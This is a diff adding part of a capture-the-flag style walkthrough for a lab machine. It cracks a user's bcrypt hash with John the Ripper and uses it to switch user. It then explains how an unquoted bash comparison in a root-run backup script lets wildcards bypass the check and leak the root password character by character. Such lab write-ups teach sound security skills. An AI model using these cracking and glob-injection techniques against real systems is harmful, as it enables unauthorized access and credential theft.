@@ -161,3 +161,94 @@ sqlite> select * from users;
 3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
 sqlite>
 ```
+
+now that I got `joshua`'s hash, I cracked it then used it to login via ssh
+
+```bash
+$ echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash
+$
+$ $ john hash --wordlist=$ROCK
+Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
+Use the "--format=bcrypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spongebob1       (?)
+1g 0:00:00:39 DONE (2024-04-17 00:25) 0.02502g/s 34.23p/s 34.23c/s 34.23C/s winston..angel123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+$
+```
+
+```bash
+svc@codify:/var/www/contact$ su joshua
+Password: 
+joshua@codify:/var/www/contact$ id
+uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
+```
+
+# root
+
+once u login as `joshua` you find out that you can execute a bash script as root
+
+```bash
+joshua@codify:/opt/scripts$ sudo -l
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+  
+joshua@codify:/opt/scripts$ cat /opt/scripts/mysql-backup.sh
+```
+
+## analyzing /opt/scripts/mysql-backup.sh
+
+```bash
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+```
+
+the problem with this script lies in the following lines which compare a user-supplied password with the credentials in `/root/.creds`
+
+```bash
+DB_PASS=$(/usr/bin/cat /root/.creds)
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+```
+
+comparing password in bash is all good till you remember that it’s done via expansion and pattern matching (e.g you can get the correct password by just supplying a `*` which is a pattern to match `anything`) but our goal is get the password rather than bypass the if statement, first thing I did was trying to figure out the password length 
+
+while the `*` pattern which match anything, there exists `?` which only matches one character, so we can use to to get the length e.g try first time with `?` then `??`, then `???` .. till you the scripts give out back a `Password confirmed!`, from there you can bruteforce character by character (e.g `a???????...` then `b??????...` then `c?????....` till you get it right then move on to the next character), getting the length was already tedious to do by hand so I made a little python script to get the password for me
